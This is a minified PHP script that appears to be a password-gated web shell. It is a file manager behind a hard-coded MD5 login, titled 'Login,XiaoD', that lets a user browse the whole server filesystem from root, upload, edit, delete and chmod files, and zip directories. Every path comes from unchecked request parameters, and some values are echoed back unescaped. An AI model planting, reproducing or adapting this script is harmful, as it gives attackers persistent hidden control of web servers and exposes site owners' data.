<?php session_start();$a="715604f5b5be4b863523319c45e5f3d7";if(isset($_POST['password'])){if(md5($_POST['password'])===$a){$_SESSION['authenticated']=true;}else{$b="Wrong password";}}if(!isset($_SESSION['authenticated'])||!$_SESSION['authenticated']){?><!DOCTYPE html><html><head><title>Login,XiaoD</title><meta charset="utf-8"><style>body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }.login-form { padding: 20px; border: 1px solid #ccc; border-radius: 5px; }input { margin: 10px 0; padding: 5px; }</style></head><body><div class="login-form"><?php if(isset($b))echo"<p style='color:red'>$b</p>";?><form method="POST"><input type="password" name="password" placeholder="Enter Password" required><br><input type="submit" value="Login"></form></div></body></html><?php exit;}function getFullPath($c){$c=str_replace('\\','/',$c);$d=array_filter(explode('/',$c),'strlen');return implode('/',$d);}function getPathBreadcrumb($c){$c=str_replace('\\','/',$c);$e='';$d=array_filter(explode('/',$c),'strlen');$f=[];foreach($d as $g){$e.='/'.$g;$f[]=['name'=>$g,'path'=>$e];}return $f;}function zipDirectory($h,$i){if(!extension_loaded('zip')){return false;}$j=new ZipArchive();if(!$j->open($i,ZIPARCHIVE::CREATE)){return false;}$h=str_replace('\\','/',realpath($h));if(is_dir($h)){$k=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($h),RecursiveIteratorIterator::SELF_FIRST);foreach($k as $l){$l=str_replace('\\','/',realpath($l));if(is_dir($l)){$j->addEmptyDir(str_replace($h.'/','',$l.'/'));}else if(is_file($l)){$j->addFromString(str_replace($h.'/','',$l),file_get_contents($l));}}}else if(is_file($h)){$j->addFromString(basename($h),file_get_contents($h));}return $j->close();}if(isset($_GET['edit'])){$l=$_GET['path'].DIRECTORY_SEPARATOR.$_GET['edit'];if(file_exists($l)){if(isset($_POST['content'])){file_put_contents($l,$_POST['content']);header("Location: ?path=".$_GET['path']);exit;}$m=file_get_contents($l);?><!DOCTYPE html><html><head><title>Edit File</title><meta charset="utf-8"><style>                body { padding: 20px; }                textarea { width: 100%; height: 500px; margin: 10px 0; }</style></head><body><h2>Editing: <?php echo $_GET['edit'];?></h2><form method="POST"><textarea name="content"><?php echo htmlspecialchars($m);?></textarea><br><input type="submit" value="Save"><a href="?path=<?php echo $_GET['path'];?>">Cancel</a></form></body></html><?php exit;}}function getFileList($c){$n=scandir($c);$k=array();$o=array();foreach($n as $p){if($p=='.'||$p=='..')continue;$q=$c.DIRECTORY_SEPARATOR.$p;if(is_dir($q)){$o[]=$p;}else{$k[]=$p;}}return array('dirs'=>$o,'files'=>$k);}$r=isset($_GET['path'])?$_GET['path']:__DIR__;if(isset($_FILES['file'])){$s=$r.DIRECTORY_SEPARATOR.basename($_FILES['file']['name']);echo "<pre>";print_r($_FILES);echo "\nUpload path: ".$s;echo "\nCurrent path: ".$r;echo "\nPermissions: ".substr(sprintf('%o',fileperms($r)),-4);echo "\nDirectory writable: ".(is_writable($r)?'Yes':'No');if(move_uploaded_file($_FILES['file']['tmp_name'],$s)){echo "\nFile uploaded successfully to: ".$s;echo "\nFile exists: ".(file_exists($s)?'Yes':'No');echo "\nFile permissions: ".substr(sprintf('%o',fileperms($s)),-4);}else{echo "\nUpload failed!";echo "\nPHP error: ".error_get_last()['message'];}echo "</pre>";}if(isset($_GET['delete'])){$l=$_GET['path'].DIRECTORY_SEPARATOR.$_GET['delete'];if(file_exists($l)){unlink($l);}}if(isset($_GET['zip'])){$h=$_GET['path'];$t=$h.'/backup_'.date('Y-m-d_H-i-s').'.zip';if(zipDirectory($h,$t)){header("Location: ?path=".urlencode($_GET['path']));}}if(isset($_GET['chmod'])&&isset($_GET['path'])&&isset($_GET['perm'])){$u=$_GET['path'].DIRECTORY_SEPARATOR.$_GET['chmod'];$v=octdec($_GET['perm']);if(chmod($u,$v)){echo "<script>alert('Permissions changed successfully');</script>";}else{echo "<script>alert('Failed to change permissions');</script>";}header("Location: ?path=".urlencode($_GET['path']));}$n=getFileList($r);?><!DOCTYPE html><html><head><title>File Manager</title><meta charset="utf-8"><style>table { width: 100%; border-collapse: collapse; }th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }.actions { display: flex; gap: 10px; }</style></head><body><h2>Current Path: <?php echo $r;?></h2><div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;"><span style="margin-right: 5px;">Path:</span><a href="?path=/">root</a> /        <?php $f=getPathBreadcrumb($r);foreach($f as $w){echo '<a href="?path='.urlencode($w['path']).'">'.htmlspecialchars($w['name']).'</a> / ';}?></div><form method="GET" style="margin: 10px 0;"><input type="text" name="path" value="<?php echo htmlspecialchars($r);?>" style="width: 80%;"><input type="submit" value="Go"><a href="?path=<?php echo urlencode(__DIR__);?>" class="btn" style="margin-left: 10px; padding: 5px 10px; background: #007bff; color: white; text-decoration: none; border-radius: 3px;">Back to Script Directory</a></form><form enctype="multipart/form-data" method="POST" action="?path=<?php echo urlencode($r);?>"><input type="file" name="file"><input type="submit" value="Upload"></form><form method="GET" style="margin: 10px 0;"><input type="hidden" name="path" value="<?php echo $r;?>"><input type="hidden" name="zip" value="1"><input type="submit" value="Backup Current Directory (ZIP)"></form><table><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr><?php if($r!='/'){?><tr><td><a href="?path=<?php echo dirname($r);?>">..</a></td><td>-</td><td>-</td><td>-</td></tr><?php }?><?php foreach($n['dirs']as $x){?><tr><td><a href="?path=<?php echo $r.DIRECTORY_SEPARATOR.$x;?>"><?php echo $x;?></a></td><td>Directory</td><td><form method="GET" style="display:inline;"><input type="hidden" name="path" value="<?php echo $r;?>"><input type="hidden" name="chmod" value="<?php echo $x;?>"><input type="text" name="perm" value="<?php echo substr(sprintf('%o',fileperms($r.DIRECTORY_SEPARATOR.$x)),-4);?>" size="4"><input type="submit" value="Chmod"></form></td><td><div class="actions"><a href="?path=<?php echo $r;?>&delete=<?php echo $x;?>">Delete</a></div></td></tr><?php }?><?php foreach($n['files']as $l){?><tr><td><?php echo $l;?></td><td><?php echo filesize($r.DIRECTORY_SEPARATOR.$l);?> bytes</td><td><form method="GET" style="display:inline;"><input type="hidden" name="path" value="<?php echo $r;?>"><input type="hidden" name="chmod" value="<?php echo $l;?>"><input type="text" name="perm" value="<?php echo substr(sprintf('%o',fileperms($r.DIRECTORY_SEPARATOR.$l)),-4);?>" size="4"><input type="submit" value="Chmod"></form></td><td><div class="actions"><a href="?path=<?php echo $r;?>&edit=<?php echo $l;?>">Edit</a><a href="?path=<?php echo $r;?>&delete=<?php echo $l;?>">Delete</a><a href="?path=<?php echo $r;?>&download=<?php echo $l;?>">Download</a></div></td></tr><?php }?></table></body></html>
